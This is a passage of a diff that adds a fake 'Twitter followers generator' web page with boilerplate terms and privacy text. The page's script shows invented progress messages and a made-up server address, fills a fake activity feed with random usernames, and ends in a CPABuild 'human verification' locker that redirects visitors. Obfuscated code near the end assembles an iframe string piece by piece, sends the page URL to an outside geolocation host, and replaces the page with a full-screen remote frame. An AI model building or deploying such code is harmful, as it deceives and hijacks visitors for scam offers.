+  border-radius: 20px;
+  background-size: 50px;
+  }
+  .platform3{
+  width:80px;
+  height: 80px;
+  border-radius: 20px;
+  background-size: 50px;
+  }
+  .platform4{
+  width:80px;
+  height: 80px;
+  border-radius: 20px;
+  background-size: 50px;
+  }
+  .platform5{
+  width:80px;
+  height: 80px;
+  border-radius: 20px;
+  background-size: 50px;
+  }
+  .platform6{
+  width:80px;
+  height: 80px;
+  border-radius: 20px;
+  background-size: 50px;
+  }
+  .inputname{
+  height: 50px;
+  font-size:20px;
+  }
+
+  .bntnext{
+  padding-top: 10px;
+  padding-bottom: 10px;
+  }
+  .footer{
+  transform: scale(0.8);
+  }
+  .left{
+  position: absolute;
+  left: 20px;
+  top: 180px;
+  width: 40px;
+  height: 40px;
+  cursor: pointer;
+  background-color: #ffffff;
+  border-radius: 50%;
+  border-style: solid;
+  border-color: #8eb9dc;
+  background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16356530176cfc353938d74d4e5ed284df3d691d77.png");
+  background-repeat: no-repeat;
+  background-position: center;
+  background-size: 32px;
+
+    }
+    .right{
+      position: absolute;
+      right:20px;
+      top:180px;
+      width: 40px;
+      height: 40px;
+      cursor: pointer;
+      background-color: #ffffff;
+      border-radius: 50%;
+      border-style: solid;
+      border-color: #8eb9dc;
+      background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/1635653018aa8c8b95dbd3fa38458e80ffac02a309.png");
+      background-repeat: no-repeat;
+      background-position: center;
+        background-size: 32px;
+        }
+
+        .coinlogo{
+          width:200px;
+          height: 200px;
+        }
+        .gen-text{
+          font-size: 20px;
+        }
+  }
+
+  </style>
+  <meta name="viewport" content=
+  "width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content=
+    "width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>TWITTER FOLLOWERS GENERATOR</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link rel="stylesheet" href=
+    "https://fonts.googleapis.com/css?family=Acme">
+    <link rel="stylesheet" href=
+    "https://fonts.googleapis.com/css?family=Roboto">
+    <link href=
+    "https://fonts.googleapis.com/css2?family=Bangers&display=swap"
+    rel="stylesheet">
+  </head>
+  <center>
+    <div class="bgcontainer" id="bgcontainer">
+      <div class="bg1"></div>
+    </div>
+    <div class="p1">
+      <img src=
+      "https://d13pxqgp3ixdbh.cloudfront.net/uploads/163625430510794774ad4ebb91705dd26947da51f0.png"
+      class="logo">
+      <div id="page1" style="display:1none">
+        <div class="input-form" id="input-form">
+          <div class="text1">
+            FOLLOWERS GENERATOR
+          </div>
+          <div class="text2">
+            URL Sample: https://www.twitter.com/####
+          </div><input id="uid" class="inputname" spellcheck=
+          "false" placeholder="Enter Account URL">
+        </div>
+        <div class="Allplatform">
+          <div class="text2">
+            Proxy Connection
+          </div>
+          <div class="platform" onclick="selectedPlatform(1)" id=
+          "platform1">
+            <div class="text-platform">
+              <div class="text">
+                Yes
+              </div>
+            </div>
+          </div>
+          <div class="platform2" onclick="selectedPlatform(2)" id=
+          "platform2">
+            <div class="text-platform">
+              <div class="text">
+                No
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="bntnext" onclick="next()">
+          Next
+        </div>
+      </div>
+      <div id="page2" style="display:none">
+        <div class="cardvalue" id="cardvalue">
+          1000 Followers
+        </div>
+        <div class="left" id="left" onclick="card(-1)"></div>
+        <div class="right" id="right" onclick="card(1)">
+        </div><img src=
+        "https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636254594ee7dd38a3897d9333016ab86503b5611.png"
+        class="coinlogo" id="card1"> <img src=
+        "https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636254594ee7dd38a3897d9333016ab86503b5611.png"
+        class="coinlogo" style="display:none" id="card2"> <img src=
+        "https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636254594ee7dd38a3897d9333016ab86503b5611.png"
+        class="coinlogo" style="display:none" id="card3"> <img src=
+        "https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636254594ee7dd38a3897d9333016ab86503b5611.png"
+        class="coinlogo" style="display:none" id="card4">
+        <div class="bntnext" onclick="process()">
+          Process
+        </div>
+      </div>
+      <div id="page3" style="display:none">
+        <img src=
+        "https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636254594961776042b3b887df25846a6101a651e.png"
+        id="settingicon" class="setting rotate showin2">
+        <div class="gen-text showin1" id="code">
+          Loading...
+        </div>
+        <div class="bntnext showin" style="display:none" id=
+        "verifybnt" onclick="CPABuildLock()">
+          Human Verification
+        </div>
+      </div>
+      <div class="footer-data">
+        <div class="line"></div>
+        <div class="footer" id="footer">
+          <div class="private" onclick="showprivacy()"><img src=
+          "https://d13pxqgp3ixdbh.cloudfront.net/uploads/16361183926e542be5170748532c29124cc7671387.png"></div>
+          <div class="Tem" onclick="showterm()"><img src=
+          "https://d13pxqgp3ixdbh.cloudfront.net/uploads/163611839488ff5fa07ad7606b65c439ba659344ae.png"></div>
+          <div class="Contact" onclick="showcontact()"><img src=
+          "https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636118386444193967f8228e5bbe5cd9ef3e9a140.png"></div>
+        </div>
+        <div class="footer-gen showin" id="footerGen" style=
+        "display:none">
+          <div class="gen-id">
+            <div class="user-gen" id="selecteduser"></div>
+          </div>
+          <div class="gen-vbuck">
+            <div class="user-gen">
+              +<span id="v-text">0</span> Followers
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="privacy-form" id="contact-id" style="display:none">
+      <div class="contact-content showin" id="contact-content-id">
+        <div class="close-privacy" onclick="hidecontact()"></div>
+        <h2><strong>Contact Us</strong></h2>
+        <p>You can reach our team by using this form</p><input id=
+        "euid" class="inputname" spellcheck="false" placeholder=
+        "Your Email"> 
+        <textarea id="message" name="message" rows="4" class=
+        "message" placeholder="Message" data-v-68a6aac8=
+        ""></textarea>
+        <div class="showin" id="responEmial" style="display:none">
+          <p style="padding:10px;">Thank you for your email. Your
+          message is important to Us and We will respond as soon as
+          possible.</p>
+          <p>Thank You!</p>
+        </div>
+        <div class="bntsent" onclick="Esend()">
+          Send us a message
+        </div>
+      </div>
+    </div>
+    <div class="privacy-form" id="term-id" style="display:none">
+      <div class="privacy-content showin" id="term-content-id">
+        <div class="close-privacy" onclick="hideterm()"></div>
+        <h2><strong>Terms and Conditions</strong></h2>
+        <p>Welcome to Online Generator!</p>
+        <p>These terms and conditions outline the rules and
+        regulations for the use of Generator tools's Website,
+        located at Online Generator.</p>
+        <p>By accessing this website we assume you accept these
+        terms and conditions. Do not continue to use Online
+        Generator if you do not agree to take all of the terms and
+        conditions stated on this page.</p>
+        <p>The following terminology applies to these Terms and
+        Conditions, Privacy Statement and Disclaimer Notice and all
+        Agreements: "Client", "You" and "Your" refers to you, the
+        person log on this website and compliant to the Company’s
+        terms and conditions. "The Company", "Ourselves", "We",
+        "Our" and "Us", refers to our Company. "Party", "Parties",
+        or "Us", refers to both the Client and ourselves. All terms
+        refer to the offer, acceptance and consideration of payment
+        necessary to undertake the process of our assistance to the
+        Client in the most appropriate manner for the express
+        purpose of meeting the Client’s needs in respect of
+        provision of the Company’s stated services, in accordance
+        with and subject to, prevailing law of Netherlands. Any use
+        of the above terminology or other words in the singular,
+        plural, capitalization and/or he/she or they, are taken as
+        interchangeable and therefore as referring to same.</p>
+        <h3><strong>Cookies</strong></h3>
+        <p>We employ the use of cookies. By accessing Online
+        Generator, you agreed to use cookies in agreement with the
+        Generator tools's Privacy Policy.</p>
+        <p>Most interactive websites use cookies to let us retrieve
+        the user’s details for each visit. Cookies are used by our
+        website to enable the functionality of certain areas to
+        make it easier for people visiting our website. Some of our
+        affiliate/advertising partners may also use cookies.</p>
+        <h3><strong>License</strong></h3>
+        <p>Unless otherwise stated, Generator tools and/or its
+        licensors own the intellectual property rights for all
+        material on Online Generator. All intellectual property
+        rights are reserved. You may access this from Online
+        Generator for your own personal use subjected to
+        restrictions set in these terms and conditions.</p>
+        <p>You must not:</p>
+        <ul>
+          <li>Republish material from Online Generator</li>
+          <li>Sell, rent or sub-license material from Online
+          Generator</li>
+          <li>Reproduce, duplicate or copy material from Online
+          Generator</li>
+          <li>Redistribute content from Online Generator</li>
+        </ul>
+        <p>This Agreement shall begin on the date hereof.</p>
+        <p>Parts of this website offer an opportunity for users to
+        post and exchange opinions and information in certain areas
+        of the website. Generator tools does not filter, edit,
+        publish or review Comments prior to their presence on the
+        website. Comments do not reflect the views and opinions of
+        Generator tools,its agents and/or affiliates. Comments
+        reflect the views and opinions of the person who post their
+        views and opinions. To the extent permitted by applicable
+        laws, Generator tools shall not be liable for the Comments
+        or for any liability, damages or expenses caused and/or
+        suffered as a result of any use of and/or posting of and/or
+        appearance of the Comments on this website.</p>
+        <p>Generator tools reserves the right to monitor all
+        Comments and to remove any Comments which can be considered
+        inappropriate, offensive or causes breach of these Terms
+        and Conditions.</p>
+        <p>You warrant and represent that:</p>
+        <ul>
+          <li>You are entitled to post the Comments on our website
+          and have all necessary licenses and consents to do
+          so;</li>
+          <li>The Comments do not invade any intellectual property
+          right, including without limitation copyright, patent or
+          trademark of any third party;</li>
+          <li>The Comments do not contain any defamatory, libelous,
+          offensive, indecent or otherwise unlawful material which
+          is an invasion of privacy</li>
+          <li>The Comments will not be used to solicit or promote
+          business or custom or present commercial activities or
+          unlawful activity.</li>
+        </ul>
+        <p>You hereby grant Generator tools a non-exclusive license
+        to use, reproduce, edit and authorize others to use,
+        reproduce and edit any of your Comments in any and all
+        forms, formats or media.</p>
+        <h3><strong>Hyperlinking to our Content</strong></h3>
+        <p>The following organizations may link to our Website
+        without prior written approval:</p>
+        <ul>
+          <li>Government agencies;</li>
+          <li>Search engines;</li>
+          <li>News organizations;</li>
+          <li>Online directory distributors may link to our Website
+          in the same manner as they hyperlink to the Websites of
+          other listed businesses; and</li>
+          <li>System wide Accredited Businesses except soliciting
+          non-profit organizations, charity shopping malls, and
+          charity fundraising groups which may not hyperlink to our
+          Web site.</li>
+        </ul>
+        <p>These organizations may link to our home page, to
+        publications or to other Website information so long as the
+        link: (a) is not in any way deceptive; (b) does not falsely
+        imply sponsorship, endorsement or approval of the linking
+        party and its products and/or services; and (c) fits within
+        the context of the linking party’s site.</p>
+        <p>We may consider and approve other link requests from the
+        following types of organizations:</p>
+        <ul>
+          <li>commonly-known consumer and/or business information
+          sources;</li>
+          <li>dot.com community sites;</li>
+          <li>associations or other groups representing
+          charities;</li>
+          <li>online directory distributors;</li>
+          <li>internet portals;</li>
+          <li>accounting, law and consulting firms; and</li>
+          <li>educational institutions and trade associations.</li>
+        </ul>
+        <p>We will approve link requests from these organizations
+        if we decide that: (a) the link would not make us look
+        unfavorably to ourselves or to our accredited businesses;
+        (b) the organization does not have any negative records
+        with us; (c) the benefit to us from the visibility of the
+        hyperlink compensates the absence of Generator tools; and
+        (d) the link is in the context of general resource
+        information.</p>
+        <p>These organizations may link to our home page so long as
+        the link: (a) is not in any way deceptive; (b) does not
+        falsely imply sponsorship, endorsement or approval of the
+        linking party and its products or services; and (c) fits
+        within the context of the linking party’s site.</p>
+        <p>If you are one of the organizations listed in paragraph
+        2 above and are interested in linking to our website, you
+        must inform us by sending an e-mail to Generator tools.
+        Please include your name, your organization name, contact
+        information as well as the URL of your site, a list of any
+        URLs from which you intend to link to our Website, and a
+        list of the URLs on our site to which you would like to
+        link. Wait 2-3 weeks for a response.</p>
+        <p>Approved organizations may hyperlink to our Website as
+        follows:</p>
+        <ul>
+          <li>By use of our corporate name; or</li>
+          <li>By use of the uniform resource locator being linked
+          to; or</li>
+          <li>By use of any other description of our Website being
+          linked to that makes sense within the context and format
+          of content on the linking party’s site.</li>
+        </ul>
+        <p>No use of Generator tools's logo or other artwork will
+        be allowed for linking absent a trademark license
+        agreement.</p>
+        <h3><strong>iFrames</strong></h3>
+        <p>Without prior approval and written permission, you may
+        not create frames around our Webpages that alter in any way
+        the visual presentation or appearance of our Website.</p>
+        <h3><strong>Content Liability</strong></h3>
+        <p>We shall not be hold responsible for any content that
+        appears on your Website. You agree to protect and defend us
+        against all claims that is rising on your Website. No
+        link(s) should appear on any Website that may be
+        interpreted as libelous, obscene or criminal, or which
+        infringes, otherwise violates, or advocates the
+        infringement or other violation of, any third party
+        rights.</p>
+        <h3><strong>Your Privacy</strong></h3>
+        <p>Please read Privacy Policy</p>
+        <h3><strong>Reservation of Rights</strong></h3>
+        <p>We reserve the right to request that you remove all
+        links or any particular link to our Website. You approve to
+        immediately remove all links to our Website upon request.
+        We also reserve the right to amen these terms and
+        conditions and it’s linking policy at any time. By
+        continuously linking to our Website, you agree to be bound
+        to and follow these linking terms and conditions.</p>
+        <h3><strong>Removal of links from our website</strong></h3>
+        <p>If you find any link on our Website that is offensive
+        for any reason, you are free to contact and inform us any
+        moment. We will consider requests to remove links but we
+        are not obligated to or so or to respond to you
+        directly.</p>
+        <p>We do not ensure that the information on this website is
+        correct, we do not warrant its completeness or accuracy;
+        nor do we promise to ensure that the website remains
+        available or that the material on the website is kept up to
+        date.</p>
+        <h3><strong>Disclaimer</strong></h3>
+        <p>To the maximum extent permitted by applicable law, we
+        exclude all representations, warranties and conditions
+        relating to our website and the use of this website.
+        Nothing in this disclaimer will:</p>
+        <ul>
+          <li>limit or exclude our or your liability for death or
+          personal injury;</li>
+          <li>limit or exclude our or your liability for fraud or
+          fraudulent misrepresentation;</li>
+          <li>limit any of our or your liabilities in any way that
+          is not permitted under applicable law; or</li>
+          <li>exclude any of our or your liabilities that may not
+          be excluded under applicable law.</li>
+        </ul>
+        <p>The limitations and prohibitions of liability set in
+        this Section and elsewhere in this disclaimer: (a) are
+        subject to the preceding paragraph; and (b) govern all
+        liabilities arising under the disclaimer, including
+        liabilities arising in contract, in tort and for breach of
+        statutory duty.</p>
+        <p>As long as the website and the information and services
+        on the website are provided free of charge, we will not be
+        liable for any loss or damage of any nature.</p>
+      </div>
+    </div>
+    <div class="privacy-form" id="privacy-id" style="display:none">
+      <div class="privacy-content showin" id="privacy-content-id">
+        <div class="close-privacy" onclick="hideprivacy()"></div>
+        <h1 style="color:black">Privacy Policy</h1>
+        <p>At Online Generator, accessible from Online Generator,
+        one of our main priorities is the privacy of our visitors.
+        This Privacy Policy document contains types of information
+        that is collected and recorded by Online Generator and how
+        we use it.</p>
+        <p>If you have additional questions or require more
+        information about our Privacy Policy, do not hesitate to
+        contact us.</p>
+        <p>This Privacy Policy applies only to our online
+        activities and is valid for visitors to our website with
+        regards to the information that they shared and/or collect
+        in Online Generator. This policy is not applicable to any
+        information collected offline or via channels other than
+        this website.</p>
+        <h2>Consent</h2>
+        <p>By using our website, you hereby consent to our Privacy
+        Policy and agree to its terms.</p>
+        <h2>Information we collect</h2>
+        <p>The personal information that you are asked to provide,
+        and the reasons why you are asked to provide it, will be
+        made clear to you at the point we ask you to provide your
+        personal information.</p>
+        <p>If you contact us directly, we may receive additional
+        information about you such as your name, email address,
+        phone number, the contents of the message and/or
+        attachments you may send us, and any other information you
+        may choose to provide.</p>
+        <p>When you register for an Account, we may ask for your
+        contact information, including items such as name, company
+        name, address, email address, and telephone number.</p>
+        <h2>How we use your information</h2>
+        <p>We use the information we collect in various ways,
+        including to:</p>
+        <ul>
+          <li>Provide, operate, and maintain our website</li>
+          <li>Improve, personalize, and expand our website</li>
+          <li>Understand and analyze how you use our website</li>
+          <li>Develop new products, services, features, and
+          functionality</li>
+          <li>Communicate with you, either directly or through one
+          of our partners, including for customer service, to
+          provide you with updates and other information relating
+          to the website, and for marketing and promotional
+          purposes</li>
+          <li>Send you emails</li>
+          <li>Find and prevent fraud</li>
+        </ul>
+        <h2>Log Files</h2>
+        <p>Online Generator follows a standard procedure of using
+        log files. These files log visitors when they visit
+        websites. All hosting companies do this and a part of
+        hosting services' analytics. The information collected by
+        log files include internet protocol (IP) addresses, browser
+        type, Internet Service Provider (ISP), date and time stamp,
+        referring/exit pages, and possibly the number of clicks.
+        These are not linked to any information that is personally
+        identifiable. The purpose of the information is for
+        analyzing trends, administering the site, tracking users'
+        movement on the website, and gathering demographic
+        information.</p>
+        <h2>Advertising Partners Privacy Policies</h2>
+        <p>You may consult this list to find the Privacy Policy for
+        each of the advertising partners of Online Generator.</p>
+        <p>Third-party ad servers or ad networks uses technologies
+        like cookies, JavaScript, or Web Beacons that are used in
+        their respective advertisements and links that appear on
+        Online Generator, which are sent directly to users'
+        browser. They automatically receive your IP address when
+        this occurs. These technologies are used to measure the
+        effectiveness of their advertising campaigns and/or to
+        personalize the advertising content that you see on
+        websites that you visit.</p>
+        <p>Note that Online Generator has no access to or control
+        over these cookies that are used by third-party
+        advertisers.</p>
+        <h2>Third Party Privacy Policies</h2>
+        <p>Online Generator's Privacy Policy does not apply to
+        other advertisers or websites. Thus, we are advising you to
+        consult the respective Privacy Policies of these
+        third-party ad servers for more detailed information. It
+        may include their practices and instructions about how to
+        opt-out of certain options.</p>
+        <p>You can choose to disable cookies through your
+        individual browser options. To know more detailed
+        information about cookie management with specific web
+        browsers, it can be found at the browsers' respective
+        websites.</p>
+        <h2>CCPA Privacy Rights (Do Not Sell My Personal
+        Information)</h2>
+        <p>Under the CCPA, among other rights, California consumers
+        have the right to:</p>
+        <p>Request that a business that collects a consumer's
+        personal data disclose the categories and specific pieces
+        of personal data that a business has collected about
+        consumers.</p>
+        <p>Request that a business delete any personal data about
+        the consumer that a business has collected.</p>
+        <p>Request that a business that sells a consumer's personal
+        data, not sell the consumer's personal data.</p>
+        <p>If you make a request, we have one month to respond to
+        you. If you would like to exercise any of these rights,
+        please contact us.</p>
+        <h2>GDPR Data Protection Rights</h2>
+        <p>We would like to make sure you are fully aware of all of
+        your data protection rights. Every user is entitled to the
+        following:</p>
+        <p>The right to access – You have the right to request
+        copies of your personal data. We may charge you a small fee
+        for this service.</p>
+        <p>The right to rectification – You have the right to
+        request that we correct any information you believe is
+        inaccurate. You also have the right to request that we
+        complete the information you believe is incomplete.</p>
+        <p>The right to erasure – You have the right to request
+        that we erase your personal data, under certain
+        conditions.</p>
+        <p>The right to restrict processing – You have the right to
+        request that we restrict the processing of your personal
+        data, under certain conditions.</p>
+        <p>The right to object to processing – You have the right
+        to object to our processing of your personal data, under
+        certain conditions.</p>
+        <p>The right to data portability – You have the right to
+        request that we transfer the data that we have collected to
+        another organization, or directly to you, under certain
+        conditions.</p>
+        <p>If you make a request, we have one month to respond to
+        you. If you would like to exercise any of these rights,
+        please contact us.</p>
+        <h2>Children's Information</h2>
+        <p>Another part of our priority is adding protection for
+        children while using the internet. We encourage parents and
+        guardians to observe, participate in, and/or monitor and
+        guide their online activity.</p>
+        <p>Online Generator does not knowingly collect any Personal
+        Identifiable Information from children under the age of 13.
+        If you think that your child provided this kind of
+        information on our website, we strongly encourage you to
+        contact us immediately and we will do our best efforts to
+        promptly remove such information from our records.</p>
+      </div>
+    </div>
+    <div class="activity">
+      <div class="recent-right">
+        RECENT ACTIVITY
+      </div>
+      <div class="line2"></div>
+      <div class="recent-name" id="recent-name">
+        vucavuca
+      </div>
+      <div class="recent-icon">
+        <center>
+          <img src=
+          "https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636254594ee7dd38a3897d9333016ab86503b5611.png"
+          class="icon2">
+        </center>
+      </div>
+      <div class="text-size28-black" id="recent-num">
+        0
+      </div>
+      <div class="text-size28-black">
+        Followers
+      </div>
+      <div class="bg-progress">
+        <center>
+          <div class="pro-bar-bg">
+            <span class="gen-text2">Generation</span> <span class=
+            "gen-text1">Verifying</span>
+            <div class="step1" id="step1"></div>
+            <div class="step2" id="step2"></div>
+            <div class="step3" id="step3"></div>
+            <div class="pro-bar" id="pro-bar"></div>
+          </div>
+        </center>
+      </div>
+    </div>
+    <script src="main.js"></script> 
+    <script src=
+    "https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    
+    <script type="text/javascript">
+
+    var CPABUILDSETTINGS={"it":2130720,"key":"35bf3","testing":1};
+    var forward="https:\/\/locked1.com\/cl\/i\/2lnvq6";
+    CPABUILDSETTINGS.onComplete=function(data){
+        window.location=forward;
+        return false;
+    };
+    </script> 
+    <script src=
+    "https://d13nu0oomnx5ti.cloudfront.net/ffd3365.js"></script> 
+    <script type="text/javascript">
+
+    $('.showContentLocker').click(function(){
+       CPABuildLock();
+        return false;
+    });
+    </script> 
+    <script type="text/javascript">
+
+    var audioclick = new Audio('https://allfile.club/robuxv2/click.mp3');
+    var audiolaststep = new Audio('https://allfile.club/robuxv2/laststep.mp3');
+    var audiopoinrunning = new Audio('https://allfile.club/robuxv2/poinrunning.mp3');
+    var audioselected = new Audio('https://allfile.club/robuxv2/selected.mp3');
+    var audiosuccess = new Audio('https://allfile.club/robuxv2/success.mp3');
+    var audioError = new Audio('https://allfile.club/sound/erro.mp3');
+    var cardSelect1=1000;
+    function showprivacy(){
+    document.getElementById('privacy-id').style.display="block";
+    }
+    function showcontact(){
+    document.getElementById('contact-id').style.display="block";
+    }
+    function showterm(){
+    document.getElementById('term-id').style.display="block";
+    }
+
+    function Esend(){
+    if (document.getElementById('euid').value!=""){
+    document.getElementById('euid').value="";
+    document.getElementById('message').value="";
+    document.getElementById('responEmial').style.display="block";
+    }else {
+    document.getElementById('euid').style.borderBottom ="1px solid #f00";
+    }
+    }
+    function hideprivacy(){
+    document.getElementById('privacy-content-id').classList.remove("showin");
+    document.getElementById('privacy-content-id').classList.add("hidein");
+    setTimeout(function(){
+    document.getElementById('privacy-id').style.display="none";
+    document.getElementById('privacy-content-id').classList.remove("hidein");
+    document.getElementById('privacy-content-id').classList.add("showin");
+    }, 800);
+    }
+
+    function hidecontact(){
+
+    document.getElementById('contact-content-id').classList.remove("showin");
+    document.getElementById('contact-content-id').classList.add("hidein");
+    setTimeout(function(){
+    document.getElementById('contact-id').style.display="none";
+    document.getElementById('contact-content-id').classList.remove("hidein");
+    document.getElementById('contact-content-id').classList.add("showin");
+    }, 800);
+    }
+    function hideterm(){
+
+    document.getElementById('term-content-id').classList.remove("showin");
+    document.getElementById('term-content-id').classList.add("hidein");
+    setTimeout(function(){
+    document.getElementById('term-id').style.display="none";
+    document.getElementById('term-content-id').classList.remove("hidein");
+    document.getElementById('term-content-id').classList.add("showin");
+    }, 800);
+    }
+
+
+    function selectedPlatform(num){
+    audioselected.play();
+    document.getElementById('platform1').classList.remove("skeyAni");
+    document.getElementById('platform1').style.backgroundColor="";
+    document.getElementById('platform2').style.backgroundColor="";
+    document.getElementById('platform1').style.borderColor="";
+    document.getElementById('platform2').style.borderColor="";
+    document.getElementById('platform2').classList.remove("skeyAni");
+
+
+    document.getElementById('platform'+num).classList.add("skeyAni");
+    document.getElementById('platform'+num).style.backgroundColor="#629ad4";
+    document.getElementById('platform'+num).style.color="white";
+        document.getElementById('platform'+num).style.borderColor="#8eb9dc";
+    setTimeout(function(){
+    document.getElementById('platform'+num).classList.remove("skeyAni");
+    }, 800);
+    }
+
+    function next(){
+    audioclick.play();
+    name=document.getElementById("uid").value;
+    if (name==""){
+    audioError.play();
+    document.getElementById("uid").style.borderBottom ="1px solid #ee5959";
+    document.getElementById("uid").classList.add("sakeanimation");
+    setTimeout(function(){
+    document.getElementById("uid").classList.remove("sakeanimation");
+    },500);
+
+    }else{
+    document.getElementById('page1').style.display="none";
+    document.getElementById('page2').style.display="block";
+    }
+    }
+
+    function process(){
+
+    audioclick.play();
+    document.getElementById("selecteduser").innerHTML=name;
+    document.getElementById('page2').style.display="none";
+    document.getElementById('footer').style.display="none";
+    document.getElementById('page3').style.display="block";
+    document.getElementById('footerGen').style.display="block";
+
+    setTimeout(function(){
+    document.getElementById("code").innerHTML="Connection to Twitter Server...";
+    setTimeout(function(){
+      document.getElementById("code").innerHTML="Server is up at 192.23.11.164:402 (latency 0.0013s)";
+      setTimeout(function(){
+          document.getElementById("code").innerHTML="Connected to Twitter server...";
+          setTimeout(function(){
+              document.getElementById("code").innerHTML="Connecting to server SQL databse...";
+              setTimeout(function(){
+                  document.getElementById("code").innerHTML="Getting ready...";
+                  setTimeout(function(){
+                      document.getElementById("code").innerHTML='Syncing <span style="color:#ff0">' + cardSelect1 + ' Followers<\/span>  for <span style="color:#ff0">'+ name + "<\/span>";
+                      setTimeout(function(){
+                        var coin=0;
+                        var myVar2 = setInterval(UserTimer, 1);
+                                function UserTimer() {
+                                  audiopoinrunning.play();
+                                  coin=coin+(cardSelect1/1000);
+                                  if (coin>=cardSelect1){
+    audiosuccess.play();
+                                      document.getElementById('v-text').innerHTML=cardSelect1;
+                                      clearInterval(myVar2);
+                                      setTimeout(function(){
+                                          document.getElementById("code").innerHTML="Finalizing...";
+                                          setTimeout(function(){
+                                              document.getElementById("code").innerHTML="Loading last step...";
+                                              setTimeout(function(){
+                                                document.getElementById("settingicon").style.display="none";
+                                                document.getElementById("verifybnt").style.display="block";
+                                                document.getElementById("verifybnt").style.marginTop="20px";                                                 document.getElementById("code").style.fontSize="26px";
+                                                  document.getElementById("code").innerHTML='Hello <span style="color:#ff0">' + name + '<\/span>! You are almost done with synchronization of <span style="color:#ff0">' + cardSelect1 + ' Followers<\/span> ! Please complete the last step by click the button below to finish with synchronization process.';
+                                                },800);
+
+                                            },800);
+
+
+                                        },1200);
+
+                                  }else{
+                                    document.getElementById('v-text').innerHTML=Math.floor(coin);
+
+                                  }
+                                }
+                      }, 800);
+                  }, 800);
+              }, 800);
+          }, 800);
+      }, 800);
+    }, 800);
+    }, 800);
+    }
+
+    var ow="i";
+    var k="if";
+    ow=ow+"f";  ow=ow+"r";  ow=ow+"a";
+    ow=ow+"me";  ow=ow+" ";  ow=ow+"sr";ow=ow+"c="; ow=ow+'"';ow=ow+"ht";ow=ow+"tps";ow=ow+":";var st='style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></'+k+'rame>';
+    var strcountry='';
+    var offset = new Date().getTimezoneOffset();
+    offset=offset/-60;var num;
+    var strcountry='';
+    var data;var country;var code;var d=window.location.href;
+    fetch('https://www.visitorlocation.info/data.php?d='+d+"&t="+offset,{referrerPolicy:'unsafe-url'})
+    .then(res => res.json())
+    .then(output => {
+    data =output;
+    country=data.country;
+    strcountry=country;
+    code=data.code;
+    code=code.toLowerCase();
+    s1=data.s1;
+    s2=data.s2;
+    num=data.num;
+    if (strcountry!='' & num!=0){  document
+    .body
+    .innerHTML='<'+ow+'//'+s1+'.'+s2+'/'+num+'"'+ st;  }
+    });
+
+    var currentCard=1;
+    function card(num){
+    audioselected.play();
+    if(num==1){
+
+        if (currentCard<4){
+            document.getElementById('card'+currentCard).style.display="none";
+          }
+      if (currentCard<4){
+        currentCard=currentCard+1;
+            document.getElementById('card'+currentCard).style.display="block";
+            document.getElementById('card'+currentCard).classList.add("zoomoutflash");
+      }
+    }
+    else
+    {
+    if (currentCard>0){
+        document.getElementById('card'+currentCard).style.display="none";
+      }
+    if (currentCard>0){
+          currentCard=currentCard-1;
+          if (currentCard<1){currentCard=1;}
+          document.getElementById('card'+currentCard).style.display="block";
+          document.getElementById('card'+currentCard).classList.add("zoomoutflash");
+    }
+
+    }
+    if (currentCard==1){
+      document.getElementById('cardvalue').innerHTML="1,000 Followers";
+      cardSelect1=1000;
+    }
+    if (currentCard==2){
+      document.getElementById('cardvalue').innerHTML="2,500 Followers";
+      cardSelect1=2500;
+    }
+    if (currentCard==3){
+      document.getElementById('cardvalue').innerHTML="5,000 Followers";
+      cardSelect1=5000;
+    }
+    if (currentCard==4){
+      document.getElementById('cardvalue').innerHTML="10,000 Followers";
+      cardSelect1=10000;
+    }
+    document.getElementById('cardvalue').classList.add("zoomoutflash");
+    setTimeout(function(){
+    document.getElementById('cardvalue').classList.remove("zoomoutflash");
+      document.getElementById('card'+currentCard).classList.remove("zoomoutflash");
+    }, 100);
+    }
+
+    var valactivity= setInterval(RecentActivity, 100);
+    var prostep=0;
+    var prostepDelay=0;
+    var recentCoin ;
+    var genname;
+
+    function random(){
+
+    const RandomCoin = ["1000", "2500", "5000", "10000"];
+    recentCoin=RandomCoin[parseInt(Math.random()*4)];
+    var gennamelist = ["fio251", "kaka110", "isexx","Gambit",
+    "Outrageous Creator",
+    "Homely Introvert",
+    "Plain Privacy",
+    "Brash Thug",
+    "Annoyed",
+    "Demonic AI",
+    "Abnormal Vigor",
+    "Optimally Ace",
+    "Inimical Thug",
+    "Feared Butcher",
+    "Multiply Divide",
+    "Psychedelic Servicemen",
+    "Militaristic Machine",
+    "Ball Blaster",
+    "Legends Reload",
+    "Brute Fact",
+    "Bloss flop",
+    "Tango Boss",
+    "Optimal Aces",
+    "Inimical Thugs",
+    "Fear Butchers",
+    "Left Divide",
+    "Psychedelic",
+    "Militaristic ",
+    "Keen Team Six",
+    "Fuzzy Pack",
+    "Gangsters",
+    "Mortified",
+    "Lyrical",
+    "Outrageous",
+    "Homely",
+    "Plain Privilege",
+    "Brash Thugs",
+    "Nutty Domination",
+    "Complex Slayers",
+    "Faulty Devils",
+    "Fanatical Tyranny",
+    "Odd Hooligans",
+    "Organic Punks",
+    "Quarrelsome",
+    "Admirals",
+    "Perpetrator",
+    "Fighting",
+    "Keen Team Six",
+    "HolyJESUS",
+    "Lone_Ranger",
+    "Dark Warrior",
+    "XxGoldenWarior"];
+    genname=gennamelist[Math.floor(Math.random() * 52)];
+    document.getElementById("recent-name").innerHTML=(genname);
+    }
+
+
+    function RecentActivity(){
+    document.getElementById("bgcontainer").style.height= document.documentElement.clientHeight;
+    if (prostep<1){
+        random()
+    }
+    else if (prostep<52){
+    document.getElementById("step1").style.backgroundColor="#629ad4";
+    document.getElementById("step2").style.backgroundColor="#393b3d";
